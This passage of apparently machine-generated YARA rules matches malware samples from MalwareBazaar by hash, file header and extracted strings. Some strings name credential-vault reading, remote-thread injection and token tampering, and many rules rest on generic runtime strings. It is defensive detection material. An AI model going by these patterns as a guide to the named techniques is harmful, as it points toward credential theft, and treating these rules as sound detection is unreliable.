        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB and
        all of them
}

rule Windows_ca040efdfa64cf6f1ed4a608427cb7ec730bd521dd54d02847cd45353f7b96ce
{
    meta:
        description = "Auto ML: ca040efdfa64cf6f1ed4a608427cb7ec730bd521dd54d02847cd45353f7b96ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "zXwIN"
        $s4 = "processorArchitecture=\"X86\""
        $s5 = "name=\"Enigma.exe\""
        $s6 = "type=\"win32\" />"
        $s7 = "type=\"win32\""
        $s8 = "name=\"Microsoft.Windows.Common-Controls\""
        $s9 = "processorArchitecture=\"X86\""
        $s10 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s11 = "http://pki-ocsp.symauth.com0"
        $s12 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s13 = "kernel32.dll"
        $s14 = "user32.dll"
        $s15 = "advapi32.dll"
        $s16 = "oleaut32.dll"
        $s17 = "shell32.dll"
        $s18 = "version.dll"
        $s19 = "CRYPT32.dll"
        $s20 = "SHLWAPI.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB and
        all of them
}

rule Windows_ca0969a10ef9353ff9053efd4033b4d01eceb0c490e9b808108bd7740064f068
{
    meta:
        description = "Auto ML: ca0969a10ef9353ff9053efd4033b4d01eceb0c490e9b808108bd7740064f068"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Liberty.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{202343A0-C831-4B41-B448-62629D530D94}"
        $s15 = "<Module>{e30574da-cb6e-4159-b3d1-2e4d16c71a7e}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.Threading.Tasks"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 365KB and
        all of them
}

rule Windows_ca0e2e53c24c4339d25101161f12eade64bb8d0624689aff35928ca6cbd3fc2f
{
    meta:
        description = "Auto ML: ca0e2e53c24c4339d25101161f12eade64bb8d0624689aff35928ca6cbd3fc2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "too many files"
        $s6 = "invalid filename"
        $s7 = "file too large"
        $s8 = "file not found"
        $s9 = "file stat failed"
        $s10 = "file open failed"
        $s11 = "file seek failed"
        $s12 = "write callback failed"
        $s13 = "file write failed"
        $s14 = "file create failed"
        $s15 = "file close failed"
        $s16 = "file read failed"
        $s17 = "Windows Vista"
        $s18 = "Windows Server 2008"
        $s19 = "Windows 8"
        $s20 = "Windows 7"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 394KB and
        all of them
}

rule Windows_ca62c0c61f385358ca0217b114e31eef2949f1ad95ed8604d756999dac40c643
{
    meta:
        description = "Auto ML: ca62c0c61f385358ca0217b114e31eef2949f1ad95ed8604d756999dac40c643"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "hwiniThLw&"
        $s6 = "fclose"
        $s7 = "fopen"
        $s8 = "_close"
        $s9 = "MSVCRT.dll"
        $s10 = "__getmainargs"
        $s11 = "__setusermatherr"
        $s12 = "__set_app_type"
        $s13 = "SetLastError"
        $s14 = "GetEnvironmentStringsW"
        $s15 = "GetCommandLineW"
        $s16 = "GetCurrentProcess"
        $s17 = "SetHandleInformation"
        $s18 = "CloseHandle"
        $s19 = "GetSystemTimeAsFileTime"
        $s20 = "FileTimeToSystemTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB and
        all of them
}

rule Windows_ca648846b0c18d9ae93fa8053a4d87c6e7f9447e69c085cfc749a385c03f9627
{
    meta:
        description = "Auto ML: ca648846b0c18d9ae93fa8053a4d87c6e7f9447e69c085cfc749a385c03f9627"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6255KB and
        all of them
}

rule Windows_ca8a9bd612d1901bebd9bc1df651120ce8428238353f7ea694b8f1b09478f2c6
{
    meta:
        description = "Auto ML: ca8a9bd612d1901bebd9bc1df651120ce8428238353f7ea694b8f1b09478f2c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1231KB and
        all of them
}

rule Windows_ca9b7d7e6c9100b5f7987a56ade722b373343af8be2e498723219a8d6d993257
{
    meta:
        description = "Auto ML: ca9b7d7e6c9100b5f7987a56ade722b373343af8be2e498723219a8d6d993257"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADfw"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "HybR.exe"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "<Module>"
        $s11 = "kernel32.dll"
        $s12 = "System"
        $s13 = "Module"
        $s14 = "System.Reflection"
        $s15 = "System.IO"
        $s16 = "DataSet1"
        $s17 = "System.Data"
        $s18 = "DataSet"
        $s19 = "System.Runtime.Serialization"
        $s20 = "get_DataTable1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 633KB and
        all of them
}

rule Windows_cac7ea634c540650c427a4b28bb1cd110f17dddc92ce15c9b7e7d5b118a99386
{
    meta:
        description = "Auto ML: cac7ea634c540650c427a4b28bb1cd110f17dddc92ce15c9b7e7d5b118a99386"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5092KB and
        all of them
}

rule Windows_149e9d049c83abff4843e0fab7f6cde552aef61e32a53d61e76f6c5adc3db25f
{
    meta:
        description = "Auto ML: 149e9d049c83abff4843e0fab7f6cde552aef61e32a53d61e76f6c5adc3db25f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = ".rsrc"
        $s4 = ",gEtd,"
        $s5 = "iwIN"
        $s6 = "-JgETa"
        $s7 = "msvcrt.dll"
        $s8 = "memset"
        $s9 = "getenv"
        $s10 = "fopen"
        $s11 = "fwrite"
        $s12 = "fclose"
        $s13 = "__set_app_type"
        $s14 = "__getmainargs"
        $s15 = "shell32.dll"
        $s16 = "ShellExecuteA"
        $s17 = "kernel32.dll"
        $s18 = "SetUnhandledExceptionFilter"
        $s19 = "<requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1164KB and
        all of them
}

rule Android_cada4fc7c97ff0f3da057e253393e36345480051efb6ec1c448415ff908e3c21
{
    meta:
        description = "Auto ML: cada4fc7c97ff0f3da057e253393e36345480051efb6ec1c448415ff908e3c21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/arctic.attheme"
        $s2 = "assets/bluebubbles.attheme"
        $s3 = "assets/countries.txt}X"
        $s4 = "assets/currencies.json"
        $s5 = "assets/darkblue.attheme"
        $s6 = "assets/day.attheme"
        $s7 = "assets/DomainConfigu"
        $s8 = "assets/emoji/0_0.png"
        $s9 = "assets/emoji/0_1.png"
        $s10 = "assets/emoji/0_10.png"
        $s11 = "assets/emoji/0_100.png"
        $s12 = "assets/emoji/0_1000.png"
        $s13 = "assets/emoji/0_1001.png"
        $s14 = "assets/emoji/0_1002.png"
        $s15 = "assets/emoji/0_1003.png"
        $s16 = "assets/emoji/0_1004.png"
        $s17 = "assets/emoji/0_1005.png"
        $s18 = "assets/emoji/0_1006.png"
        $s19 = "assets/emoji/0_1007.png"
        $s20 = "assets/emoji/0_1008.png"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 57796KB and
        all of them
}

rule Linux_caf40c1678b62e1fefa323b0c60604905258eca5f153d6bf51487d483463784c
{
    meta:
        description = "Auto ML: caf40c1678b62e1fefa323b0c60604905258eca5f153d6bf51487d483463784c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4_?wq"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 44KB and
        all of them
}

rule Windows_cb05f61ce4669963e3a556c8f7f4770ee82c5182bd265899abc2a0caaf2c4f10
{
    meta:
        description = "Auto ML: cb05f61ce4669963e3a556c8f7f4770ee82c5182bd265899abc2a0caaf2c4f10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetWindowsVersion>g__HKLM_GetString|11_0"
        $s5 = "<GetScanArgs>b__5_0"
        $s6 = "Microsoft.Win32"
        $s7 = "<GetTokens>d__2"
        $s8 = "<Module>"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_ReleaseID"
        $s11 = "set_ReleaseID"
        $s12 = "get_TaskID"
        $s13 = "set_TaskID"
        $s14 = "get_ASCII"
        $s15 = "get_JSON"
        $s16 = "get_ScanVPN"
        $s17 = "set_ScanVPN"
        $s18 = "System.IO"
        $s19 = "get_BlockedIP"
        $s20 = "set_BlockedIP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB and
        all of them
}

rule Windows_cb1ae846ff0cf850daca17d92289cbbcd099f5ea3b68c3f3877409b8c4df2b44
{
    meta:
        description = "Auto ML: cb1ae846ff0cf850daca17d92289cbbcd099f5ea3b68c3f3877409b8c4df2b44"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = "[+] Got target proc PID: %d"
        $s16 = "[*] Opened Target Handle"
        $s17 = "[*] Opened Target Token Handle"
        $s18 = "SetTokenInformation failed"
        $s19 = "[*] Token Integrity set to Untrusted"
        $s20 = "Failed to create an instance of ITaskService: %x"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 189KB and
        all of them
}

rule Windows_cb1c3a7659a975e2878f8a1737d412c18a83ba15ffbaa20cdda309a434150f7c
{
    meta:
        description = "Auto ML: cb1c3a7659a975e2878f8a1737d412c18a83ba15ffbaa20cdda309a434150f7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_BHYxNOuI"
        $s6 = "System.IO"
        $s7 = "DELETEHELPER"
        $s8 = "System.Data"
        $s9 = "loadData"
        $s10 = "Read"
        $s11 = "QuanLyHS_Load"
        $s12 = "QuanLyGV_Load"
        $s13 = "add_Load"
        $s14 = "ManHinhChinh_Load"
        $s15 = "DangNhap_Load"
        $s16 = "DangKy_Load"
        $s17 = "TTGiangDay_Load"
        $s18 = "get_OrangeRed"
        $s19 = "get_Checked"
        $s20 = "set_Checked"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1092KB and
        all of them
}

rule Linux_cb30f47c6e8148a5a89a61577dd8f3f312d7f434022b4b1f54a1d6e649a236e1
{
    meta:
        description = "Auto ML: cb30f47c6e8148a5a89a61577dd8f3f312d7f434022b4b1f54a1d6e649a236e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "setsockopt"
        $s9 = "read"
        $s10 = "memset"
        $s11 = "getppid"
        $s12 = "opendir"
        $s13 = "getsockopt"
        $s14 = "open"
        $s15 = "setsid"
        $s16 = "closedir"
        $s17 = "close"
        $s18 = "getsockname"
        $s19 = "HTTP/1.1"
        $s20 = "User-Agent:"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 45KB and
        all of them
}

rule Linux_cb6e47f38542b8527d75e508d073d8d5f060aab8951c854cf2c984ca017057bb
{
    meta:
        description = "Auto ML: cb6e47f38542b8527d75e508d073d8d5f060aab8951c854cf2c984ca017057bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "write"
        $s9 = "setsockopt"
        $s10 = "read"
        $s11 = "memset"
        $s12 = "getppid"
        $s13 = "opendir"
        $s14 = "getsockopt"
        $s15 = "open"
        $s16 = "setsid"
        $s17 = "closedir"
        $s18 = "close"
        $s19 = "getsockname"
        $s20 = ".text"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB and
        all of them
}

rule Windows_cb8c3014c82ec218c86dd1d3e022399658def5b6b3632ba99c6700d044d32fc6
{
    meta:
        description = "Auto ML: cb8c3014c82ec218c86dd1d3e022399658def5b6b3632ba99c6700d044d32fc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "`.reloc"
        $s3 = "Lwin"
        $s4 = "kernel32.dll"
        $s5 = "GetModuleHandleA"
        $s6 = "USER32.dll"
        $s7 = "ADVAPI32.dll"
        $s8 = "OpenProcessToken"
        $s9 = "OLEAUT32.dll"
        $s10 = "MSVCP140.dll"
        $s11 = "D3DX11CreateShaderResourceViewFromMemory"
        $s12 = "ntdll.dll"
        $s13 = "D3D11CreateDeviceAndSwapChain"
        $s14 = "ImmSetCandidateWindow"
        $s15 = "D3DCOMPILER_43.dll"
        $s16 = "dwmapi.dll"
        $s17 = "VCRUNTIME140_1.dll"
        $s18 = "VCRUNTIME140.dll"
        $s19 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s20 = "fgetc"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 20760KB and
        all of them
}

rule Windows_cc26dca6301b50e3a5f5270ebbe9c1d797bb1f1f3205f7ade8e310a6f19e59c0
{
    meta:
        description = "Auto ML: cc26dca6301b50e3a5f5270ebbe9c1d797bb1f1f3205f7ade8e310a6f19e59c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 191KB and
        all of them
}

rule Windows_cc3a1b5d38511917728521771d1c0137aa5851b35796ed74faf3d30124144277
{
    meta:
        description = "Auto ML: cc3a1b5d38511917728521771d1c0137aa5851b35796ed74faf3d30124144277"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1457KB and
        all of them
}

rule Linux_14b5be85dfdb18553e9bd92160a7107a89fb7df0dc8a8be450a29c3607d86ba9
{
    meta:
        description = "Auto ML: 14b5be85dfdb18553e9bd92160a7107a89fb7df0dc8a8be450a29c3607d86ba9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 87KB and
        all of them
}

rule Windows_cc44b762d57a9c109e4255cb94fd3f550a18bc005a45aaed1ac9c99d806e6c20
{
    meta:
        description = "Auto ML: cc44b762d57a9c109e4255cb94fd3f550a18bc005a45aaed1ac9c99d806e6c20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "wINoIQ"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "CorExitProcess"
        $s9 = "An application has made an attempt to load the C runtime library incorrectly."
        $s10 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s11 = "- Attempt to initialize the CRT more than once."
        $s12 = "- unable to open console device"
        $s13 = "- unexpected multithread lock error"
        $s14 = "- not enough space for thread data"
        $s15 = "- floating point support not loaded"
        $s16 = "SystemFunction036"
        $s17 = "ADVAPI32.DLL"
        $s18 = "GetProcessWindowStation"
        $s19 = "GetUserObjectInformationA"
        $s20 = "GetLastActivePopup"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 723KB and
        all of them
}

rule Windows_cc658ef20e0e8a449f5e6028f8514db2d628f30d2d648cec718d69a1b61bd16e
{
    meta:
        description = "Auto ML: cc658ef20e0e8a449f5e6028f8514db2d628f30d2d648cec718d69a1b61bd16e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Unable to resolve HTTP prox"
        $s5 = "get_Item1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "ReadInt32"
        $s10 = "get_Item2"
        $s11 = "get_Item3"
        $s12 = "ReadInt64"
        $s13 = "ReadInt16"
        $s14 = "VaultGetItem_WIN7"
        $s15 = "VaultGetItem_WIN8"
        $s16 = "<Module>"
        $s17 = "FileHandleID"
        $s18 = "fileHandleID"
        $s19 = "lpdwProcessID"
        $s20 = "processID"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 234KB and
        all of them
}

rule Windows_cc7ad818e9d4037c72b8cafeee214ecf2f6fe6c9af43ebfa221fb68cc7b5f966
{
    meta:
        description = "Auto ML: cc7ad818e9d4037c72b8cafeee214ecf2f6fe6c9af43ebfa221fb68cc7b5f966"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4322KB and
        all of them
}

rule Linux_cc89c9863a98c23561e39dcc055985d44eac4d135188350a7af98664a5d5d78a
{
    meta:
        description = "Auto ML: cc89c9863a98c23561e39dcc055985d44eac4d135188350a7af98664a5d5d78a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Linux_ccb522743975c843639ce11f87a13aa9a687f5782b65368a0828372e74737921
{
    meta:
        description = "Auto ML: ccb522743975c843639ce11f87a13aa9a687f5782b65368a0828372e74737921"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 36KB and
        all of them
}

rule Windows_cce4850cc383b394e43d8c7c4963d75a1611e1db82746b0515659c8db8cf0e1f
{
    meta:
        description = "Auto ML: cce4850cc383b394e43d8c7c4963d75a1611e1db82746b0515659c8db8cf0e1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB and
        all of them
}

rule Windows_cce5686ff01c5d4248e87b002a345f6d7647d3aca7cc218e27dff28f90fec6b8
{
    meta:
        description = "Auto ML: cce5686ff01c5d4248e87b002a345f6d7647d3aca7cc218e27dff28f90fec6b8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "an_activity_to_calm_the_nerves.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5599KB and
        all of them
}

